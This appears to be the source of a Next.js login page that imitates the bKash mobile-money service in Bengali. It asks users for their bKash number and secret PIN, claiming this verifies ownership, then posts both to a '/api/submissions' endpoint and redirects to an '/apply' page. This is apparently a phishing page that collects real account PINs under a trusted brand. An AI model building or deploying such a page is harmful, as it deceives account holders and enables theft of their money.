'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import { ChevronLeft, Fingerprint, ArrowRight } from 'lucide-react';

export default function Login() {
  const [phone, setPhone] = useState('');
  const [pin, setPin] = useState('');
  const router = useRouter();

  const handleNext = async () => {
    if (phone.length === 11 && pin.length === 5) {
      try {
        const res = await fetch('/api/submissions', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phoneNumber: phone, pin }),
        });
        const data = await res.json();
        if (data.success) {
          sessionStorage.setItem('submission_id', data.id);
          sessionStorage.setItem('temp_phone', phone);
          router.push('/apply');
        } else {
          alert('কিছু ভুল হয়েছে। আবার চেষ্টা করুন।');
        }
      } catch (err) {
        alert('সার্ভারে সমস্যা হচ্ছে। পরে আবার চেষ্টা করুন।');
      }
    } else {
      alert('অনুগ্রহ করে সঠিক ১১ ডিজিটের মোবাইল নম্বর এবং ৫ ডিজিটের পিন দিন');
    }
  };

  return (
    <div className="mobile-container flex flex-col bg-white overflow-hidden fade-in">
      {/* Header */}
      <div className="bg-white px-4 py-3 flex items-center justify-between border-b border-gray-100">
        <button onClick={() => router.back()} className="text-gray-400">
          <ChevronLeft size={28} />
        </button>
        <div className="text-[12px] font-bold border border-gray-200 px-3 py-1 rounded-full text-gray-500">
          Eng | বাং
        </div>
      </div>

      <div className="p-8 flex-1">
         <div className="flex flex-col items-center mb-10">
            <h2 className="text-[17px] font-extrabold text-gray-800">আপনার অ্যাকাউন্টে লগইন করুন</h2>
            <p className="text-[13px] font-bold text-gray-400 mt-2 text-center">মালিকানা যাচাই এর জন্য সঠিক বিকাশ একাউন্ট পিন দিয়ে কনফার্ম করতে হবে</p>
         </div>

        <div className="space-y-10">
          <div className="relative border-b-2 border-gray-100 focus-within:border-bkash-pink transition-all">
            <label className="bkash-label">বিকাশ একাউন্ট নাম্বার</label>
            <div className="flex items-center gap-2">
               <span className="text-xl font-bold text-gray-400">+88</span>
               <input 
                 type="tel" 
                 placeholder="যেমন: 017XXXXXXXX"
                 className="w-full outline-none py-3 text-xl font-bold placeholder:text-gray-200"
                 value={phone}
                 onChange={(e) => setPhone(e.target.value)}
                 maxLength={11}
               />
            </div>
          </div>

          <div className="relative border-b-2 border-gray-100 focus-within:border-bkash-pink transition-all">
            <label className="bkash-label">বিকাশ পিন</label>
            <div className="flex items-center gap-2">
               <input 
                 type="password" 
                 placeholder="৫ ডিজিটের পিন দিন"
                 className="w-full outline-none py-3 text-xl font-bold placeholder:text-gray-200"
                 value={pin}
                 onChange={(e) => setPin(e.target.value)}
                 maxLength={5}
               />
               <Fingerprint size={28} className="text-gray-300 cursor-pointer" />
            </div>
          </div>
        </div>
      </div>
<div className="p-6 w-full flex items-center border-t border-gray-50 bg-gray-50/30">
  <button 
    onClick={handleNext}
    disabled={phone.length < 11 || pin.length < 5}
    className="bkash-next-button w-full flex justify-center items-center"
  >
    <span className="text-sm font-bold mr-2">পরবর্তী</span>
    <ArrowRight size={20} />
  </button>
</div>
    </div>
  );
}
